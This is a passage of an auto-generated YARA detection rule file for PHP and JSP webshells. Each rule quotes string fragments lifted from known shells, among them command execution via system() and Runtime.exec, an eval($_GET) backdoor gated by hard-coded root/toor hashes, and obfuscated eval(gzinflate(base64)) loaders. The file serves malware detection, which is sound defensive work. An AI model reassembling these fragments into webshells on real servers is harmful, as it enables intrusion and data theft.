      $s18 = "response.setHeader(\"content-type\",\"text/html; charset=ISO-8859-1\");" fullword ascii
      $s19 = "response.setHeader(\"Content-Disposition\",\"attachment; filename=\\\"\"+f.getName()+\"\\\"\");" fullword ascii
      $s20 = " <b>\"+strDir+\"</b></td><td>\" + getDrivers() + \"</td></tr></table><br>\\r\\n\");" fullword ascii
   condition:
      uint16(0) == 0x253c and filesize < 80KB and
      1 of ($x*) and 4 of them
}

rule webshell_php_a {
   meta:
      description = "webshell - file a.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "acf1d4aa144f360a634d699c8cc887c40cb00b46294fd8bfb9679d0ba1e37e23"
   strings:
      $s1 = "<input name=\"submit_btn\" type=\"submit\" value=\"Execute Command\"></p> " fullword ascii
      $s2 = "  PHP Shell is aninteractive PHP-page that will execute any command " fullword ascii
      $s3 = "  entered. See the files README and INSTALL or http://www.gimpster.com " fullword ascii
      $s4 = "<meta http-equiv=\"Content-Type\" content=\"text/html; charset=windows-1250\"></head> " fullword ascii
      $s5 = "  Copyright (C) 2000-2002 Martin Geisler <gimpster@gimpster.com> " fullword ascii
      $s6 = "  system($command); " fullword ascii
      $s7 = "  address: http://www.gnu.org/copyleft/gpl.html#SEC1 " fullword ascii
      $s8 = "  } else if ($command == 'ls') { " fullword ascii
      $s9 = "  if (!empty($command)) { " fullword ascii
      $s10 = "  if (!empty($HTTP_GET_VARS)) " fullword ascii
      $s11 = "$work_dir = exec('pwd'); " fullword ascii
      $s12 = "<h1>PHP Shell <?php echo offender ?></h1> " fullword ascii
      $s13 = "  Place - Suite 330, Boston, MA  02111-1307, USA. " fullword ascii
      $s14 = "<p>Command: <input type=\"text\" name=\"command\" size=\"60\"> " fullword ascii
      $s15 = "define('PHPSHELL_VERSION', '1.7'); " fullword ascii
      $s16 = "if (!empty($command)) { " fullword ascii
      $s17 = "  if (!empty($HTTP_POST_VARS)) " fullword ascii
      $s18 = "  $Id: phpshell.php,v 1.18 2002/09/18 15:49:54 gimpster Exp $ " fullword ascii
      $s19 = "<title>PHP Shell <?php echo offender ?></title> " fullword ascii
      $s20 = "    $tmpfile = tempnam('/tmp', 'phpshell'); " fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 20KB and
      8 of them
}

rule webshell_php_bh {
   meta:
      description = "webshell - file bh.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "f1b9ac2936e5ff769cd3f64179d11c93900d9b448551142cb4fa84c9c3ef9a85"
   strings:
      $x1 = "$blackhat = \"7P12s+PWsSiIfpYi/B/2qUlfVlpMmFbCsnwNEDOJGQQJnGZPAYCY52y47f/+QO69q2mVV7bs8u33XlGXXFJgDZm5Zc6FBfibyp1d/+nnp2r/Bwi2LQ" ascii
      $x2 = "# Blackhat Shell By cr1p.blogspot.com " fullword ascii
      $s3 = "Rp13iV6In103QiqIPZDGx2LON+04cCmQi3oLziFwsaJkElJDwFPjgpDn4A9N9kvQofcDhp3/8VQNHuH9SyA9h7WFSr7Bqn+h682ltlStOZbKmPJEfrFi2dz9ThSknDll" ascii
      $s4 = "aYH7FBAsfaVpfuNmNRvUgpIRCpWKSOc1qG41r9buSaiU0QCOUzWG8itAn2xQDZzQYQZOwOXGVE2VBVnXTKueinW5Ql/tQ9cFq38GxoF+vLjfXBySlY7Mypdkfq+Y7Bbq" ascii
      $s5 = "grARKTngbKTtqMk83K+lgW5kVvbfO1YTRuWPvbdKxJOpqHshJrg740LnT4rC70ZZwt4ljsbFedaPF75pJb11la79fkta7wfTotJZa1GqTPuLF6+LGFakel9U26a4fg7l" ascii
      $s6 = "wbHLpugHcVO55v4nitfTR269nVehS19gFbaH01wsXHqFdkH5bIlKTRJC+uQ2fLPDlLS3qRS0KcVsuGSZte/O7avVoejgeGS12qMFj3eyOl9eI2zZOKTK19NHqJm0JYyI" ascii
      $s7 = "1ccBQuqfh6bq58myDPaKv19QrUvdpLPcI4e6Sk+C+E8faF5lmSvT6VfhT+AMjUrZFA75lfWPPMQ5Sdmjiw/1Pn671EdqVj0GiTvEQ3TYvG9WLoGOXjwfHvNeB4DxN4zl" ascii
      $s8 = "sTlME8tHF6wBObria2sFzXxO/VeFA/Xp9Pm355tjlk3nI9xmYxYMNnlEEgYdINrAWVmf+M4/rZlb3DlCr25Gfz+bcYmX7LzK5/VU2tx9Qyp//ggNSSPY9NreOha9wauo" ascii
      $s9 = "rFxu7NDlln0rWBptAzxsYO3CDNhB6XBr3xA/Q7ND5151ogynNXYy+kg5+BlBuHhzDA3sRu2ajnb0J0hbIUqXYpHsvC4bp13gkPiCT7+O9Cgl5r4L+WI6Tt35d+GELbfb" ascii
      $s10 = "d58Mdf/PuJiRcYyJGsWofS6QpwEwslKtbryTdtB5EWSbdAgA7NeQSZ9Ld9xjS1GssgONnQJgGOESjV57Nu/69S/2ztnX4z/wB5T1qCPDy5WJawZU71HdkYdC80UoML/C" ascii
      $s11 = "uZCps+ekmwlPEyEgkHtEio4gVkeAb/GMRAx5VER3+6pFVLTKHh1lxBqVG5L+bQl9KUH9I9utiIOARUFtWkWrqa7n8Evl6++5vpOM/5BMu3dInZ0KSPN0u7YLTP9lfIjZ" ascii
      $s12 = "XBa/V8Lv31fBmJvzNkj1C+EMv05pastovkqrSjzj0zXDf65ehfrO/9ZJvV6p6Es+DysGp77vAau8JIRCMvHvb+lyxr11y/3VffUvwxkR9xn3+8Br17r94svPqlUq39d0" ascii
      $s13 = "jKrFdqb7xm2xnHK1NK0DKYE+PAAnrCzgmFa7WeL/V3Fe2NXADYAFJIAjUXELSKqzlcbgfviWX46fvoqb22ILAPaK8p4gi1YNlFIBbDLlFKIuu82bd50kGYCSPM6TMqbA" ascii
      $s14 = "yDs9oc3L3MtnJwlue8DTTQrSSkwr5fTP+FuMHRryrieC/fDaOdhabrF4ETH4dUjuOfj4CfEuj0sk18oxUWNsYeAdwONpKzUc+01UWCmhpdGTP8p/QOPIoy9G9/RJkBRy" ascii
      $s15 = "uXgetBdrA4zFKmrhkGTkE8FMZqWLY1kI/8s1IhqsDQtU1q9BZ5fm6IIIufZF8PD2mqIEKHdDkQQty2dGLyTXwJ0MdtCrIstCpgF62SnJ0c8MoWaV74Gygm2HroD81h5G" ascii
      $s16 = "L2073ksGIB+ZYLnxpRDcLOIXJxygfto/h3RLWzl3/AspznQe9Fb2pNJlB+gr2/XdNG+C+tK0JzErjukj8YQxDnoPxv8LnBsils0UPyrfxLEIA77w6rycjIPdLLFRnJQp" ascii
      $s17 = "/bf/QvbyP5FTPu/tdj+QtD+TUO5azfHg7Hy/n2pqT8pR/53y9Qt8FuXiTtvg0bqys/XuhgvsCx+IG/dz3z70v6RFb9pi+qYfzYppbexPKARwu6+e5re7nSvft8y4N3Dj" ascii
      $s18 = "u265aeZHeyRilQaeZbJ08lwL3B20jl0aILZgdv+ogi8gbnxifKcfC6lTVrOQkqhlvzjrT/YN2W8QfVsOhl2OssBKeAGalZK5Ta03TfoOmVm77OjHM6nLnbb6QspyQ9Fm" ascii
      $s19 = "Ons5l1c328o39+b0Cyhyx9o/NI+XiLiB0kqetXbmDnPqHZfa4egXnqfG/zzzJ99XJEXjmQ+4SF74DOVDc/o/Li+EtfyhKhFtpbOy4tnplzzsK075+aZ5IavCx43m39/3" ascii
      $s20 = "KyBEouqZ+cRdLlAXqJsVZIJiGBSzSuLruTVSiCFqB4G1LXF5GEAeiSULV90me1Xc72QSkFQoyqO9Hbz+MFQnSMmuC4NKDwFadWidjqkKCwO5v9MpnjHcLNYzBgIjCHVW" ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 700KB and
      1 of ($x*) and 4 of them
}

rule webshell_php_Shu1337 {
   meta:
      description = "webshell - file Shu1337.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "e9b08f71eabe70ea1dbd85c4c8f30144f29c4f8ca998c7bec2041fbe6d2d8e74"
   strings:
      $x1 = "$inori = \"JHZxSyA9ICI3bzFjcmtjV2Z0bzYySzRyLzRwbGVFenh4RmsyRkl2SjJiT0xPSHV2TzNxc2FxZE50Z2NSU25pVTU3c3N2WmxmYmd2MDk1a203ejNDaFMze" ascii
      $s2 = "NYUGVObTVIR2RHQ1Vzenp1L0Y2Tk5uVzNHV2J3dlpSZWxzRXIrcHRXeUhrZnZobmFjZTFHQjhpSjE0bWNUSE1FazZnTEJkYXFSc3gxYnZFclZVNlJKT1dURFhaYS82UW" ascii
      $s3 = "dCUzJwcTRvS2ovQm1PaDlxMVZadjhGSlNmUS9QOUVCYWw3YVBjQUJDS2V0Wmp0czBTcDhzQ0ZON3kyOElSQzZxMnJ5SnQvNVRJN0NlRUs3aVhtYTNEbWRBaGR4YnRlU0" ascii
      $s4 = "pWM2I0RTgrMzdVTkorRFU0L3dMOTRzaTNVU29mZ3QzQlNlWCtvYmhzaWRWZW9EY2xnNVBaR3NSRkRac1NGeUFmdllKM3hZSkVzRkRCK0o3RDhOMVNZT0tpZVppRkM0Qy" ascii
      $s5 = "VXZmdGN3VwM1NweEJuVGQrNTZxVmZ0dllnSGlRMGUvK2E4TyI7DQpyaW55KHRtdmFzeW5ncihvbmZyNjRfcXJwYnFyKCgkdnFLKSkpKTsNCj8+DQo8cHJhZ3JlPjxvZT" ascii
      $s6 = "JjMnBnY2lkS1drR1lSa2pLdW9UQ1owNjh1NFQvT3dkSVZyOTIyY2xWRFZyeVNYOWxKMzFRQkFWQ2RkVWxRQ1cwN2dnRUtnRll3KzVhYzhPNWcrWlIrcWE2YUtUN3Vyb2" ascii
      $s7 = "9ueGxYWWV2VmdMNVZhS2h2aDVpcENwYkpURTB1WGgxaFN2WStlVDdoalIxQnRYeWNqTC9zcWpHNWR0ZnJPN1ZoOW1vN0s3NmhZVENOdllYdXY1LytodHppcitFUjRwM3" ascii
      $s8 = "hxaVhITy9TYjRTdUFteGdLRkpmSWg4ZkxCcHo4cXVNa2V2bjNNNnFncklQZUZ2U00rWnZBQmdnVmY5YSsrQUwveWRabWtxSkJnbldhdDduaEhMYktlOGtUMkp3cUpyeU" ascii
      $s9 = "VrMkdhRUdxZm5lQnc3UjdOT3VtZU1jWW80SnRvZ3Q3dkpZcGI0RS83cU52SGs2Y3dhZSt1NUdjU2JlOGwvR1dLQXB6SGxIV0F3R1RxV2VwUVM4TnVPQzcwQlFOelJxeV" ascii
      $s10 = "1LakNPUWVaYzhjOW5Ra1NtUmF3c1BXNEtNdllCdnlZSDIwa1Q0ckJ5U21WZU1ZMzkwRFIyYWptQU5KT08vQjV0dGRQQUxISnVCZzNDR1VGTlNkU0ZHaXBKWGx6bjhsUz" ascii
      $s11 = "N5MFRZT0g5OVplSThFQjBzanNjS2xLV3FRa0M1aC9uSmFqYngvYUVYTWc3d0VZcWtTMEJpMS92cDVyMmN5NStqMnNUWWUvTXZkM1h5M2FiTWVjZlhvbUJXSUlyVUNNNS" ascii
      $s12 = "1MWGdGaFlCN1VHUDlyTmpheW5aS3dpcW1ob0lEZUhuU2dja1lHd0lwZ0NQS3FCVk9SWk9WRmpjNm5lRnpWTFVFclpoS3BpWkozWG1CYi8ya3F3YlZJcjRhZUpZSkhUQ3" ascii
      $s13 = "pVWWlscmdIazVSVTA0eFlhT2UyeG1idmtMZmc5VjZrT0h6RTVmS1R2bHBOTWt2THJHRy9wSi9PRldOYU1lTUQ4RzUvRHU5Q2JKZzVEWXphVHRYaTRkZmVuNDNjMU55ZT" ascii
      $s14 = "hqNFh5ZWV5eHV5d1dZWUI3V3RIOTZQYjEzbHRKRlVUTmpWVzlzSDNMenFlNzUvUW83a0cyTjljOHJOSUVqblIzaUNBclJlRm4rMDJyNzFtN1d6cHJpTUxwVG5RWEk2dj" ascii
      $s15 = "JKektVeWVGbTloS0prMlJQdFpQTWpiTmZteFFJVnJJMUpJRURhdndNWGJ2cVE3eXZOMzUyV2JSOGpPMHZNRG5MVHhtN1ArUnhFKzI0MHUzeEIvN1VzNThrczg0YitEOW" ascii
      $s16 = "FKRmszYzRKbjZlSFFYc2dtd09nSWpMVys2TEVBWFNndEhzWWxOOVlGd1RJQVFkZ2F5VDRGY2lLMW93bnBKd3pCYTNOSkdRalFrMFAxYzBLNTlMUmt3UDBDSWwrUi9SaD" ascii
      $s17 = "tacFZSU2RGOTMzYWl2Wm5yaE9uSERjSkpTV1JYbUZycXk1bHNGSlNYbUZMOUozS2lRVmY1Ykl2WGpIREIwY0V4akJOQ1Jnd1Qyd1EzcThIRWd1a0RkUVVsS2RHYVVnS1" ascii
      $s18 = "hzaWJaQjJWUDIyV3pUV1JyVWZSWHBEcFRuV1pjZW1qNjU3bEY5Yk9XMXVKQlpONkRUNllkcXlhdXN1WTh4WWRpeENhalNmUWs0Z05DbFhLVVdXT0NQVWtWL3dhUkVxOF" ascii
      $s19 = "k3dUgvQjQ0azh6ME4rakRUN3ZPcTk0WnFGd010ajByMXZPQ1RUM2k0MnZVVHJ4M05NNmpOM3dQN2oxNGphOFFhaXBUQ043WkxuQ01BTXdtQTZNTWttRVJUSzNVaFU5Nk" ascii
      $s20 = "RUNG5YTjFsVzRVbjRyMkF5UVJkNXJnSGlrREJtN0ZvSjl4bE83c01oNUJwSm80WWE5YmFJdlcxSUYzbStna0RPMXNTZ0FHdFptcVMrbmptZU4raEwrQ3VEOEQrd25oM2" ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 200KB and
      1 of ($x*) and 4 of them
}

rule webshell_php_pwhash {
   meta:
      description = "webshell - file pwhash.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "cfccc4dc2ee493e35cacab4aee80f2ec6386441afc309bd6e9ea5e481ab1a47a"
   strings:
      $s1 = " * pwhash.php file for PHP Shell 2.1" fullword ascii
      $s2 = "<h1>Password Hasher for PHP Shell 2.1</h1>" fullword ascii
      $s3 = "  <title>Password Hasher for PHP Shell 2.1</title>" fullword ascii
      $s4 = "$password = isset($_POST['password']) ? $_POST['password'] : '';" fullword ascii
      $s5 = "latest version at <a href=\"http://mgeisler.net/php-shell/\">mgeisler.net/php-shell/</a>." fullword ascii
      $s6 = " * Copyright (C) 2005 Martin Geisler <mgeisler@mgeisler.net>" fullword ascii
      $s7 = "$username = isset($_POST['username']) ? $_POST['username'] : '';" fullword ascii
      $s8 = "  echo \"  <p><i>Enter a username and a password and update.</i></p>\\n\";" fullword ascii
      $s9 = "  <legend>Password</legend>" fullword ascii
      $s10 = "if ($username == '' || $password == '') {" fullword ascii
      $s11 = "  <input name=\"password\" type=\"text\" value=\"<?php echo $password ?>\">" fullword ascii
      $s12 = "Copyright &copy; 2005, <a href=\"mailto:mgeisler@mgeisler.net\">Martin Geisler</a>. Get the" fullword ascii
      $s13 = "  \"<tt>&nbsp;</tt>\" (space), \"<tt>[</tt>\" (left bracket), \"<tt>|</tt>\" (pipe)," fullword ascii
      $s14 = "<form action=\"<?php $_SERVER['PHP_SELF']; ?>\" method=\"POST\">" fullword ascii
      $s15 = " * Licensed under the GNU GPL.  See the file COPYING for details." fullword ascii
      $s16 = "<!DOCTYPE HTML PUBLIC \"-//W3C//DTD HTML 4.01//EN\"" fullword ascii
      $s17 = "  <link rel=\"stylesheet\" href=\"style.css\" type=\"text/css\">" fullword ascii
      $s18 = "        $hash = $fkt . ':' . $salt . ':' . $fkt($salt . $password);" fullword ascii
      $s19 = "  <input name=\"username\" type=\"text\" value=\"<?php echo $username ?>\">" fullword ascii
      $s20 = "  <legend>Username</legend>" fullword ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 8KB and
      8 of them
}

rule webshell_jsp_guest {
   meta:
      description = "webshell - file guest.jsp"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "8db4b99711e38a16567f0cbcde2ae568b68c33324649f09fb85714f717a684cf"
   strings:
      $s1 = "            Process p = Runtime.getRuntime().exec(c);" fullword ascii
      $s2 = "        ResultSet r = m.executeQuery(\"select * from \" + x[3]);" fullword ascii
      $s3 = "                sb.append(\"Execute Successfully!\\t|\\t\\r\\n\");" fullword ascii
      $s4 = "                m.executeUpdate(q);" fullword ascii
      $s5 = "            ResultSet r = m.executeQuery(q);" fullword ascii
      $s6 = "        Connection c = DriverManager.getConnection(x[1].trim());" fullword ascii
      $s7 = "    }//new String(s.getBytes(\"ISO-8859-1\"),c);}    Connection GC(String s) throws Exception {" fullword ascii
      $s8 = "                    sb.append(EC(r.getString(i), cs) + \"\\t|\\t\");" fullword ascii
      $s9 = "            sb.append(r.getString(1) + \"\\t\");" fullword ascii
      $s10 = "    String cs = request.getParameter(\"z0\")==null?\"gbk\": request.getParameter(\"z0\") + \"\";" fullword ascii
      $s11 = "                sb.append(d.getColumnName(i) + \"\\t|\\t\");" fullword ascii
      $s12 = "    response.setContentType(\"text/html;charset=\" + cs);" fullword ascii
      $s13 = "            sb.append(r.getString(\"TABLE_NAME\") + \"\\t\");" fullword ascii
      $s14 = "                sF += l[i].getName() + \"\\t\" + sT + \"\\t\" + l[i].length() + \"\\t\"" fullword ascii
      $s15 = "    String Z = EC(request.getParameter(Pwd) + \"\", cs);" fullword ascii
      $s16 = "                sb.append(l[i].getName() + \"/\\t\" + sT + \"\\t\" + l[i].length()" fullword ascii
      $s17 = "        os.write((\"|\" + \"<-\").getBytes(), 0, 3);" fullword ascii
      $s18 = "    String z2 = EC(request.getParameter(\"z2\") + \"\", cs);" fullword ascii
      $s19 = "        os.write((\"->\" + \"|\").getBytes(), 0, 3);" fullword ascii
      $s20 = "    String z1 = EC(request.getParameter(\"z1\") + \"\", cs);" fullword ascii
   condition:
      uint16(0) == 0x253c and filesize < 30KB and
      8 of them
}

rule webshell_php_smowu {
   meta:
      description = "webshell - file smowu.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "65f4630106eaf6604952c79f8a6406c7c18de5f95eb222bb4b1851e2e6f9bd32"
   strings:
      $x1 = "<html><head><meta http-equiv=\"Content-Type\" content=\"text/html; charset=windows-1251\"><meta http-equiv=\"Content-Language\" " ascii
      $x2 = "<tr><td width=\"50%\" height=\"1\" valign=\"top\"><center><b>:: Enter ::</b><form method=\"POST\"><input type=hidden name=act va" ascii
      $x3 = "<p align=\"left\" style=\"color:red\"><b>Disable functions:&nbsp;passthru, proc_open, shell_exec, system</b></p><p align=\"left" ascii
      $s4 = "t=\"en-us\"><title>thecompanyart.com - c99madshell</title><STYLE>TD { FONT-SIZE: 8pt; COLOR: #ebebeb; FONT-FAMILY: verdana;}BODY" ascii
      $s5 = "<tr><td width=\"100%\" height=\"1\" valign=\"top\" colspan=\"2\"><p align=\"center\"><b>:: Command execute ::</b></p></td></tr>" fullword ascii
      $s6 = "<td><a href=\"#\" onclick=\"document.todo.act.value='f';document.todo.f.value='wp-login.php';document.todo.ft.value='edit';docum" ascii
      $s7 = "='f';document.todo.f.value='wp-login.php';document.todo.ft.value='download';document.todo.d.value='%2Fvar%2Fwww%2Fhtml%2Fwordpre" ascii
      $s8 = ".value='f';document.todo.f.value='wp-blog-header.php';document.todo.ft.value='download';document.todo.d.value='%2Fvar%2Fwww%2Fht" ascii
      $s9 = "'wp-blog-header.php';document.todo.ft.value='download';document.todo.d.value='%2Fvar%2Fwww%2Fhtml%2Fwordpress';document.todo.sub" ascii
      $s10 = "<td><a href=\"#\" onclick=\"document.todo.act.value='f';document.todo.f.value='wp-blog-header.php';document.todo.ft.value='edit'" ascii
      $s11 = "<br><TABLE style=\"BORDER-COLLAPSE: collapse\" height=1 cellSpacing=0 borderColorDark=#666666 cellPadding=0 width=\"100%\" bgCol" ascii
      $s12 = "en name=\"cmd_txt\" value=\"1\">&nbsp;<input type=submit name=submit value=\"Execute\"></form></td><td width=\"50%\" height=\"1" ascii
      $s13 = "<td><a href=\"#\" onclick=\"document.todo.act.value='f';document.todo.f.value='wp-comments-post.php';document.todo.ft.value='edi" ascii
      $s14 = "lue='wp-comments-post.php';document.todo.ft.value='download';document.todo.d.value='%2Fvar%2Fwww%2Fhtml%2Fwordpress';document.to" ascii
      $s15 = "ct.value='f';document.todo.f.value='wp-comments-post.php';document.todo.ft.value='download';document.todo.d.value='%2Fvar%2Fwww%" ascii
      $s16 = "<p align=\"left\" style=\"color:red\"><b>Disable functions:&nbsp;passthru, proc_open, shell_exec, system</b></p><p align=\"left" ascii
      $s17 = "<td><a href=\"#\" onclick=\"document.todo.act.value='f';document.todo.f.value='wp-login.php';document.todo.ft.value='edit';docum" ascii
      $s18 = ".value='wp-login.php';document.todo.submit();\">04.11.2009 16:49:40</a></td>" fullword ascii
      $s19 = "<input type=submit name=submit value=\"Execute\"></form></td></tr></TABLE>" fullword ascii
      $s20 = ";<input type=\"checkbox\" name=\"actbox[]\" id=\"actbox22\" value=\"/var/www/html/wordpress/wp-login.php\"></td>" fullword ascii
   condition:
      uint16(0) == 0x683c and filesize < 200KB and
      1 of ($x*) and 4 of them
}

rule webshell_php_idc {
   meta:
      description = "webshell - file idc.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "b1e9dd4672b9826b70602ae5e759469cd6bb63c2acc29765436ef2ae26eb3a83"
   strings:
      $s1 = "if (md5($_GET['usr'])==$user && md5($_GET['pass'])==$pass)" fullword ascii
      $s2 = "$user=\"63a9f0ea7bb98050796b649e85481845\"; #root" fullword ascii
      $s3 = "$pass=\"7b24afc8bc80e548d66c4e7ff72171c5\"; #toor" fullword ascii
      $s4 = "{eval($_GET['idc']);}" fullword ascii
      $s5 = "7b24afc8bc80e548d66c4e7ff72171c5" ascii
      $s6 = "63a9f0ea7bb98050796b649e85481845" ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 1KB and
      all of them
}

rule wso2_pack {
   meta:
      description = "webshell - file wso2_pack.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "90c5c29a4e1228fe6e2b8788852a51a8aea07fe556bf54d849233cff3d558309"
   strings:
      $s1 = "preg_replace(\"/.*/e\",\"\\x65\\x76\\x61\\x6C\\x28\\x67\\x7A\\x69\\x6E\\x66\\x6C\\x61\\x74\\x65\\x28\\x62\\x61\\x73\\x65\\x36\\x" ascii
      $s2 = "75+9ksed/bF79cHb6NX/rMXH+v+MbQaftOIDIH605Pzg6M3Lwb+QIzsb1N//tuHBnDroP7b1tPpa42DD/dePf/tw8P64Yuj608fDuqfTp8JDjpBbiaOgt+U1tt6RvUCZ" ascii
      $s3 = "jHZMowtDLl5+eh+ua3XwnbaBkVGJnf3LJxE+T6yRhu2C0tj/yCG4kmatKfWZmTrB829SmVquLnMx32Tm7p8OuZK6Ugps9kCZiU3hutwWu96L/UuMbdBx+J7GRPyKQ8Ax" ascii
      $s4 = "EfdJpHNFQ+Nxiuve9I5rKwfT3OStVib9tAQvUY6qkTzKSy9QB2ddBuFtPPr4o6IFh4G7zVyuB2+j0Zb3W+nRYZzxLaL1x66PMsddHFLABgODt/sn1LVn22Y9V1+iwi1U" ascii
      $s5 = "khAGwnoTIIy/j0n+6CHDK1K1mmT/oTZoc1a2LxKDkz9MYdZLIN5QDBJwmOBOKJCX9GY08rJPpU4c5E2VyCusQJx9ccmcQ+WE/dgJeLqD24nrt5cgbiGSVxT1B7nEyezz" ascii
      $s6 = "WD6NLlDmwb/A2OB7cIut5e2RR+U72zMvz9AajOSmU5FbdmnmyHuP5lH3z0/hHENjRWxzfaP9s5+e7fftidzP/ZmThhTuQ3QSBybChYZ2GRlnD2fTpdCG9M/Ndtpsi8pO" ascii
      $s7 = "T3fw0P1bHHdEvH2+GyfSvMOlrMZOw3+ol8oC1M9SOKR78AscR6BO7dmYqTHQwDrLmKTCOMrGQ1aUrW2pbSEmfyhhUtPyv/3IAhieWJWguVDebW0mfaVYcwnFtMnv02z3" ascii
      $s8 = "UG2ceVQiwFlhA0OZu4UwFEQZDub/c1GMHnYhsewflf2Pv6xZmEAPR5hT8dzUXYWMWf+lVOMnMFTZYVD5BXoCRbNPU6hKEYZm2wDly42ZBszF9bAjfqDer0OXRAZ5ZOyu" ascii
      $s9 = "4fusG3/YLNg2ofF4rJtj0DsHqC15q0zBTl7YVlSqyj9QWj/2GmXPPxXaBImUiLkc+mPLzU63M7UeWFV7I5VE2CgPFibO5sOSQPeFVxMJKeY9vnZwcZjXM8+0OIdbTSaD" ascii
      $s10 = "huFIwN0lIAK0hH7ZxvHnqwJsjaeDH+JVEkd1mCA8xp58kiA36zx4+AujgEt58gEpZkTj+GDGAmGg58v57D3tE3nj2UqgCm4/Jdw/Wclb6c03WjgD1jzefckFcFoWzsOG" ascii
      $s11 = "BMtT0tjxaQePhyaYC0m1Yn6npcllpKx+LdSiP6m+i4X1NU3LrUFd7vtJsLUQGqFSVsoeC39c5/Ch0s/tlJYTA1V2cy0USUXU+MLau7fL3kVpEULTVFvfrSrQTgQRFWUd" ascii
      $s12 = "2geerBjPnIXNlaPlsOkNk7SD3EQ+NFZzxddxNmQWzGpXZR/OJ3JhjFqDXWaAwoVcLlWDscqj3QX/7etyoRiVIogARAGJHe6YVbzWy4r3KzNQvcb8fPQmXj+dUt0QFX1C" ascii
      $s13 = "XdWdk/21NOO66lH58g31lHuztgSa063mtHgMRvPuvRVrlQpCxPEw+sSQHxKCKDEgPhwetwFiXB6eHzEASJn6E5gRlDurjf18EZt2cbkLqaTpVKLHeyGoPjTY2yO9qgcH" ascii
      $s14 = "5g+eOR89nD21eJWfOp1I4gm9VEv+CrcQ6DbpKLC7wzcGq2vJmTHE1t0t7xFwPBuHqwO6M3/9NXTj9JJAu2uvE+4WJQEQ3V5fZO6O8aRm41DF8bEkGsayQ0plnNinr8WU" ascii
      $s15 = "wJDERlqU0hwcgcoNpkbvjuMWw16SKjYjiAWC2VDUHTIjDJNdbbRYVNvFPiVOxK1SvObVoc990ipcsLr1Ssw9uZ5rTaG6w224y5swRsuaMRHeG9jCL0Nq1eDq8ed5iRnj" ascii
      $s16 = "BC7OH0TfIAFMjpmsoWKkptXRKWHJhb9blIJLSLRLISMYdn6cY6GS3mUxK0kEeu0WaP+n63/PGg8BmKSm3eymP1jo9YcouU7YpsaKKvgburFM1uYrzVsDx4//M+jFVARH" ascii
      $s17 = "0BSLZjCojq4RkMmaJnOdISnKcK8CbTtUdJ2ttjMnZZtFBbQOdQHOLCVLCCwgmgi15hZ2dRUq8AXs5kP2hz26ObXjcVisYFr7sYcDyVwUI1z3wTvdFBWoyJzbszxSbejr" ascii
      $s18 = "orORoXl3gUR7M3cJYWDvldY+jh0YEtiZYaO9zUwKZozkE2y3E5YKprI4tO86FwTYwWk3d6MOk/Ewsw23bi/Ke7HILdoa7at51WeWNduxJb7JJDVDL2/Liwqy39yDORZ8" ascii
      $s19 = "WhIyzCVT+syy5+K4wff86lCHkzpFacciUBgQiTY0t+EP0nT4Y+Dkov6dD7puSELhgwVDdUmGRJZuiXgT3lR0XhFujvo4TK3q+88s9MU7cemSqbOQKNy7rPneB5Rkxj4p" ascii
      $s20 = "AOZbCNn4lfbjkEr3sSC20zU0LZAdGdpqjHL7uzEXuy7HQ6Rs0VDKLaBRgiGMJqJi9WsnU1eem0niq/x314wuP6GIzIK0Xy3Qc1p/fDgwYNt8dNt4P+2bwi0Gg+q8fgba" ascii
   condition:
      uint16(0) == 0x3f3c and filesize < 70KB and
      8 of them
}

rule webshell_php_wso2 {
   meta:
      description = "webshell - file wso2.php"
      author = "yarGen Rule Generator"
      reference = "https://github.com/Neo23x0/yarGen"
      date = "2024-07-10"
      hash1 = "3fe9214b33ead5c7d1f80af469593638b9e1e5f5730a7d3ba2f96b6b555514d4"
   strings:
      $s1 = "       . '<td><nobr>' . substr(@php_uname(), 0, 120) . ' <a href=\"' . $explink . '\" target=_blank>[exploit-db.com]</a></nobr><" ascii
      $s2 = "$explink = 'http://exploit-db.com/search/?action=search&filter_description=';" fullword ascii
      $s3 = "echo \"<html><head><meta http-equiv='Content-Type' content='text/html; charset=\" . $_POST['charset'] . \"'><title>\" . $_SERVER" ascii
      $s4 = "if( wsoBruteForce($server[0],@$server[1], $_POST['login'], $line) ) {" fullword ascii
      $s5 = "echo \"<input type='checkbox' onclick='is();'> <input type=button value='Dump' onclick='document.sf.p2.value=\\\"download\\\";do" ascii
      $s6 = "       . '<td><nobr>' . substr(@php_uname(), 0, 120) . ' <a href=\"' . $explink . '\" target=_blank>[exploit-db.com]</a></nobr><" ascii
      $s7 = "                wsoSecParam('Downloaders', implode(', ',$temp));" fullword ascii
      $s8 = "die(\"<pre align=center><form method=post>Password: <input type=password name=pass><input type=submit value='>>'></form></pre>\"" ascii
      $s9 = "function wsoBruteForce($ip,$port,$login,$pass) {" fullword ascii
      $s10 = "echo \"<input type='checkbox' onclick='is();'> <input type=button value='Dump' onclick='document.sf.p2.value=\\\"download\\\";do" ascii
      $s11 = "$m = array('View', 'Highlight', 'Download', 'Hexdump', 'Edit', 'Chmod', 'Rename', 'Touch');" fullword ascii
      $s12 = "TP_HOST'] . \" - WSO \" . WSO_VERSION .\"</title>" fullword ascii
      $s13 = "<input type='button' value='md5.rednoize.com' onclick=\\\"document.hf.action='http://md5.rednoize.com/?q='+document.hf.hash.valu" ascii
      $s14 = "show_errors value=1 '.(!empty($_POST['p2'])||$_COOKIE[md5($_SERVER['HTTP_HOST']).'stderr_to_out']?'checked':'').'> redirect stde" ascii
      $s15 = "<input type='button' value='md5.rednoize.com' onclick=\\\"document.hf.action='http://md5.rednoize.com/?q='+document.hf.hash.valu" ascii
